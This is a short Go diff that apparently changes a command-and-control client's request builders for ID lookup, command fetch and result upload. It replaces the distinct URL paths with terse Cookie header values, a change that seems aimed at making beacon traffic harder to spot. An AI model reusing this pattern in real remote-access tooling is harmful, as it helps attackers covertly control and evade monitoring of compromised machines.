@@ -5,7 +5,6 @@ import (
 	"crypto/tls"
 	"net/http"
 	"net/url"
-	"path"
 )
 
 type Link struct {
@@ -26,13 +25,12 @@ func (l *Link) NewResultRequest(data []byte) (*http.Request, error) {
 	if err != nil {
 		return nil, err
 	}
-	u.Path = path.Join(u.Path, "res")
-
 	body := bytes.NewReader(data)
 	req, err := http.NewRequest("POST", u.String(), body)
 	if err != nil {
 		return nil, err
 	}
+	req.Header.Set("Cookie", "cb")
 	req.Header.Set("User-Agent", l.Id)
 	return req, nil
 }
@@ -42,12 +40,11 @@ func (l *Link) NewIdRequest() (*http.Request, error) {
 	if err != nil {
 		return nil, err
 	}
-	u.Path = path.Join(u.Path, "id")
-
 	req, err := http.NewRequest("GET", u.String(), nil)
 	if err != nil {
 		return nil, err
 	}
+	req.Header.Set("Cookie", "ci")
 	return req, nil
 }
 
@@ -56,12 +53,11 @@ func (l *Link) NewCmdRequest() (*http.Request, error) {
 	if err != nil {
 		return nil, err
 	}
-	u.Path = path.Join(u.Path, "cmd")
-
 	req, err := http.NewRequest("GET", u.String(), nil)
 	if err != nil {
 		return nil, err
 	}
+	req.Header.Set("Cookie", "gt")
 	req.Header.Set("User-Agent", l.Id)
 	return req, nil
 }
